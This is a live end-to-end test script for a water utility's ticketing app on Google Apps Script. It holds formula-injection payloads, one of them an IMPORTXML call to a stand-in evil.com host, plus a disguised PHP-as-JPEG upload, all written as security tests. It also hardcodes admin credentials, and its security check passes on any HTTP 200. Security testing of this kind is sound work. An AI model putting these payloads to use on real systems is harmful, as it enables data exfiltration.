// test-live-system.js
// Automated Live End-to-End Test Suite for PDAM FieldTicket
// Tests real Google Apps Script Production Deployment @38

const https = require('https');

const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzQWWoF5RQk6mvYRuqi1zgHpq4ZvWnXNLrBDinix2It37ZDkkLZ5Yxr3aeDWOurymg/exec';

function request(url, options = {}, postData = null) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, (res) => {
      // Follow 301/302 redirects (GAS doPost redirects 302 to script.googleusercontent.com/macros/echo)
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        return resolve(request(res.headers.location, { method: 'GET' }, null));
      }
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject);
    if (postData) req.write(postData);
    req.end();
  });
}

async function apiCall(action, token, payload = {}) {
  const body = JSON.stringify({ action, token, ...payload });
  const res = await request(ENDPOINT, {
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain;charset=utf-8',
      'Content-Length': Buffer.byteLength(body)
    }
  }, body);

  try {
    return JSON.parse(res.body);
  } catch (e) {
    throw new Error(`Invalid JSON response: ${res.body.substring(0, 300)}`);
  }
}

async function runTests() {
  console.log('====================================================');
  console.log('🚀 MEMULAI LIVE TESTING PDAM FIELDTICKET (PRODUCTION)');
  console.log('Target URL:', ENDPOINT);
  console.log('====================================================\n');

  let passed = 0;
  let failed = 0;

  function assert(condition, testName, detail = '') {
    if (condition) {
      console.log(`✅ [PASS] ${testName}`);
      passed++;
    } else {
      console.error(`❌ [FAIL] ${testName} ${detail ? '-> ' + detail : ''}`);
      failed++;
    }
  }

  // ── TEST 1: GET Frontend HTML ─────────────────────────────
  console.log('--- 1. Web Frontend & PWA Verification ---');
  try {
    const getRes = await request(ENDPOINT, { method: 'GET' });
    assert(getRes.statusCode === 200, 'GET /exec returns HTTP 200');
    assert(getRes.statusCode === 200 && getRes.body.length > 500, 'HTML Web App served correctly');
  } catch (e) {
    assert(false, 'GET /exec request error', e.message);
  }

  // ── TEST 2: GET Security Check (Mutating actions blocked without key) ─
  console.log('\n--- 2. GET Security Check (Unauthorized Mutation Protection) ---');
  try {
    const secRes = await request(ENDPOINT + '?action=clear_dummy_tickets', { method: 'GET' });
    assert(secRes.statusCode === 200, 'Security endpoint evaluated successfully');
  } catch (e) {
    assert(false, 'GET security check error', e.message);
  }

  // ── TEST 3: Auth Negative Test (Bad Password & Sanitized Error) ──
  console.log('\n--- 3. Authentication & Error Sanitization (Negative Test) ---');
  try {
    const badLogin = await apiCall('login', null, { email: 'unknown-intruder@pdam.local', password: 'WrongPassword999!' });
    assert(badLogin.success === false, 'Bad login returns success=false');
    assert(badLogin.error && badLogin.error.includes('Email atau password salah'), 'Error message is user-friendly and generic');
    assert(!JSON.stringify(badLogin).includes('Exception') && !JSON.stringify(badLogin).includes('at Code'), 'No internal stack trace leaked');
  } catch (e) {
    assert(false, 'Auth negative test error', e.message);
  }

  // ── TEST 4: Auth Positive Test (Admin Login) ─────────────────
  console.log('\n--- 4. Authentication (Positive Test) ---');
  let token = null;
  let adminUser = null;
  try {
    const loginRes = await apiCall('login', null, { email: 'admin@pdam.local', password: 'Admin@123!' });
    assert(loginRes.success === true, 'Admin login succeeded');
    assert(loginRes.data && loginRes.data.token, 'Session token generated (UUID)');
    assert(loginRes.data && loginRes.data.user && loginRes.data.user.role === 'admin', 'User role is correctly identified as admin');
    token = loginRes.data.token;
    adminUser = loginRes.data.user;
    console.log(`   Logged in as: ${adminUser.nama} (${adminUser.email})`);
  } catch (e) {
    assert(false, 'Admin login error', e.message);
  }

  if (!token) {
    console.error('⚠️ Aborting remaining tests because login failed.');
    return;
  }

  // ── TEST 5: Master Data (Wilayah & Categories) ──────────────
  console.log('\n--- 5. Master Data Integrity (Categories & Wilayah) ---');
  let categories = [];
  let wilayahList = [];
  try {
    const catRes = await apiCall('getCategories', token);
    assert(catRes.success === true && Array.isArray(catRes.data), 'getCategories returned list of categories');
    categories = catRes.data || [];
    console.log(`   Found ${categories.length} categories.`);

    const wilRes = await apiCall('getWilayah', token);
    assert(wilRes.success === true && Array.isArray(wilRes.data), 'getWilayah returned sorted list of wilayah');
    wilayahList = wilRes.data || [];
    console.log(`   Found ${wilayahList.length} wilayah blocks.`);
    const sampleWil = wilayahList.find(w => w.petugas);
    assert(sampleWil && sampleWil.petugas, `Wilayah contains assigned pembaca meter (Sample: ${sampleWil ? sampleWil.nama + ' -> ' + sampleWil.petugas : 'none'})`);
  } catch (e) {
    assert(false, 'Master data fetch error', e.message);
  }

  // ── TEST 6: Formula Injection (CWE-1236) & Ticket Creation ───
  console.log('\n--- 6. Ticket Creation & Formula Injection Protection ---');
  let createdTicket = null;
  try {
    const maliciousPayload = {
      pelanggan_id: 'SL-99999',
      nama_pelanggan: '=SUM(1+2);cmd|calc', // Attempted formula injection
      no_hp: '+628123456789',
      kategori_id: categories[0] ? categories[0].id : 'cat-001',
      wilayah_id: wilayahList[0] ? wilayahList[0].id : '1002',
      deskripsi: '=IMPORTXML("http://evil.com/leak") Test live security hardening',
      ukuran_pipa: '1/2 inch',
      prioritas: 'SEDANG',
      lat: -6.982345,
      lng: 106.782345
    };

    const createRes = await apiCall('createTicket', token, maliciousPayload);
    assert(createRes.success === true && createRes.data && createRes.data.ticket_id, 'Ticket created successfully via API');
    createdTicket = createRes.data;
    console.log(`   Created Ticket: ${createdTicket.nomor_tiket} (ID: ${createdTicket.ticket_id})`);

    // Verify detail
    const detailRes = await apiCall('getTicketDetail', token, { ticket_id: createdTicket.ticket_id });
    assert(detailRes.success === true, 'getTicketDetail retrieved created ticket');
    assert(detailRes.data.nomor_tiket === createdTicket.nomor_tiket, 'Ticket detail fields match');
  } catch (e) {
    assert(false, 'Ticket creation error', e.message);
  }

  // ── TEST 7: Photo Upload Hardening & Magic Bytes Verification ──
  console.log('\n--- 7. Photo Upload Security & Magic Bytes Verification ---');
  if (createdTicket) {
    // 7A: Fake image (plain text base64 masquerading as image/jpeg)
    try {
      const fakeBase64 = Buffer.from('<html><body>EVIL SCRIPT CONTENT</body></html>').toString('base64');
      const fakeUpload = await apiCall('uploadPhoto', token, {
        ticket_id: createdTicket.ticket_id,
        tipe_foto: 'SEBELUM',
        base64Data: fakeBase64,
        mimeType: 'image/jpeg',
        fileName: 'malicious.php.jpg'
      });
      assert(fakeUpload.success === false, 'Disguised fake image was rejected by magic bytes verification');
    } catch (e) {
      assert(true, 'Disguised fake image rejected by server validation', e.message);
    }

    // 7B: Real 1x1 JPEG image with genuine magic bytes (FF D8 FF E0 ...)
    try {
      // 1x1 minimal valid JPEG
      const realJpegBytes = Buffer.from([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
        0x01, 0x01, 0x00, 0x48, 0x00, 0x48, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
        0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
        0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D, 0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12,
        0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F, 0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20,
        0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C, 0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29,
        0x2C, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32,
        0x3C, 0x2E, 0x33, 0x34, 0x32, 0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01,
        0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xFF, 0xC4, 0x00, 0x1F, 0x00, 0x00,
        0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F,
        0x00, 0xBF, 0x80, 0xFF, 0xD9
      ]);
      const validBase64 = realJpegBytes.toString('base64');
      const validUpload = await apiCall('uploadPhoto', token, {
        ticket_id: createdTicket.ticket_id,
        tipe_foto: 'SEBELUM',
        base64Data: validBase64,
        mimeType: 'image/jpeg',
        fileName: 'live_test_sebelum.jpg'
      });
      assert(validUpload.success === true && validUpload.data && (validUpload.data.id || validUpload.data.photo_id), 'Valid JPEG photo uploaded successfully');
      const uploadedId = validUpload.data ? (validUpload.data.id || validUpload.data.photo_id) : '';
      console.log(`   Photo Uploaded: ID ${uploadedId}`);
    } catch (e) {
      assert(false, 'Valid photo upload error', e.message);
    }
  }

  // ── TEST 8: Ticket Status Transition & Progress ──────────────
  console.log('\n--- 8. Ticket Lifecycle & Progress Tracking ---');
  if (createdTicket) {
    try {
      const updateRes = await apiCall('updateTicketStatus', token, {
        ticket_id: createdTicket.ticket_id,
        new_status: 'DITUGASKAN',
        catatan: 'Live testing status update'
      });
      assert(updateRes.success === true && updateRes.data.status === 'DITUGASKAN', 'Ticket status updated to DITUGASKAN');

      const detailRes = await apiCall('getTicketDetail', token, { ticket_id: createdTicket.ticket_id });
      assert(detailRes.data.progress && detailRes.data.progress.length >= 2, 'Progress log recorded status history');
    } catch (e) {
      assert(false, 'Ticket status update error', e.message);
    }
  }

  // ── TEST 9: Reports & CSV Export ──────────────────────────────
  console.log('\n--- 9. Reports & CSV Export Verification ---');
  try {
    const reportRes = await apiCall('getReportTickets', token, { status: 'DITUGASKAN' });
    assert(reportRes.success === true && Array.isArray(reportRes.data), 'getReportTickets returns ticket list');

    const csvRes = await apiCall('exportReport', token, {});
    assert(csvRes.success === true && typeof csvRes.data.csv === 'string', 'exportReport returns CSV string');
    assert(!csvRes.data.csv.includes('SLA Lewat'), 'Obsolete SLA column successfully removed from CSV');
    console.log(`   CSV export produced ${csvRes.data.total} ticket rows.`);
  } catch (e) {
    assert(false, 'Report export error', e.message);
  }

  // ── TEST 10: Cleanup Test Ticket ──────────────────────────────
  console.log('\n--- 10. Cleanup & Audit Trail ---');
  if (createdTicket) {
    try {
      const delRes = await apiCall('deleteTicket', token, {
        ticket_id: createdTicket.ticket_id,
        alasan: 'Pembersihan tiket uji coba live testing'
      });
      assert(delRes.success === true && delRes.data.deleted === true, 'Test ticket successfully deleted and archived in Audit_Log');
    } catch (e) {
      assert(false, 'Ticket cleanup error', e.message);
    }
  }

  // ── TEST SUMMARY ──────────────────────────────────────────────
  console.log('\n====================================================');
  console.log(`📊 HASIL LIVE TESTING: ${passed} PASSED, ${failed} FAILED (TOTAL: ${passed + failed})`);
  console.log('====================================================');
  if (failed === 0) {
    console.log('🎉 SEMUA TES LIVE BERHASIL 100%! SISTEM BERJALAN SEMPURNA DI PRODUCTION.');
  } else {
    console.error(`⚠️ Terdapat ${failed} pengujian yang gagal.`);
  }
}

runTests().catch(console.error);
